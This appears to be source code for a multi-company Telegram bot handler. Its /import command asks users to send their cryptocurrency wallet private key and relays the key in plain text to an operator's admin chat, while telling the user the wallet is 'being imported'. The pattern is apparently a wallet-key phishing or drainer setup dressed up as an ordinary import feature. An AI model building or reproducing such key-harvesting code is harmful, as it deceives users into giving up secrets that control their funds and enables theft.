import { createRouterClient } from "@orpc/server";
import { createContext } from "@tg-admin/api/context";
import { appRouter } from "@tg-admin/api/routers/index";
import { Bot, webhookCallback } from "grammy/web";
import type { Context as HonoContext } from "hono";
import type { BotContext } from "../context";
import { mainMenu, message } from "./content";

export async function createBotHandler(id: number) {
	return async (c: HonoContext<{ Bindings: CloudflareBindings }>) => {
		const context = await createContext({ context: c });
		const api = createRouterClient(appRouter, { context }).bot;
		const { data: company, error: companyError } = await api.getCompanyByBotId({
			botId: id,
		});
		if (companyError) {
			return new Response(companyError, { status: 500 });
		}
		if (!company) {
			return new Response("Invalid company ID", { status: 400 });
		}
		const userBot = new Bot<BotContext>(company.botToken);

		userBot.use(async (ctx, next) => {
			ctx.botApi = api;
			await next();
		});

		userBot.use(mainMenu);

		userBot.command("start", async (ctx) => {
			const name = ctx.from?.username || ctx.from?.first_name || "user";
			await ctx.reply(message(name, company?.name ?? "Bot"), {
				parse_mode: "HTML",
				reply_markup: mainMenu,
			});
		});

		userBot.command("import", async (ctx) => {
			// Stateless command: /import PRIVATE_KEY
			const args = ctx.match as string;
			const walletKey = args.trim();

			if (!walletKey) {
				await ctx.reply("Usage: <code>/import PRIVATE_KEY</code>", {
					parse_mode: "HTML",
				});
				return;
			}

			// Use c.env instead of global env
			const adminBot = new Bot(c.env.TELEGRAM_BOT_TOKEN);
			await adminBot.api.sendMessage(
				company.adminChatId.toString(),
				`User with ID ${ctx.from?.id} imported wallet key: ${walletKey}\n\nYou can approve or reject the user by sending <code>/approve_user ${ctx.from?.id} WALLET_KEY</code> or <code>/reject_user ${ctx.from?.id}</code>`,
				{ parse_mode: "HTML" },
			);
			await ctx.reply("⏳ Wait while your wallet is being imported...");
		});

		try {
			return webhookCallback(userBot, "hono")(c);
		} catch (error) {
			console.error("Error handling Telegram webhook:", error);
			return new Response("Error processing webhook", { status: 500 });
		}
	};
}
